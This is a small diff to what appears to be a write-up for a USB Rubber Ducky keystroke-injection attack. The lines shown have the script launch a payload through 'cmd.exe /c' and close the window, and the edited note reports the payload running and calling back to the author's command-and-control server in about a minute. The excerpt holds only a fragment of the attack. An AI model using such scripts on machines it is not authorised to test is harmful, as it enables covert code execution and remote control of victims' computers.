@@ -13,6 +13,6 @@ type("cmd.exe /c <full path to payload.ext>\n");
 delay(1000);
 press("ENTER");
 press("ALT F4");
-\
-\
-*My payload was about 450kB in size, and it took around 1 min and 5 seconds for the complete execution of this script and get a callback on my c2 server*
+
+
+\\My payload was about 450kB in size, and it took around 1 min and 5 seconds for the complete execution of this script and get a callback on my c2 server. This time includes the OS boot time of the Rubber Ducky as well (which is about 20-25 seconds).
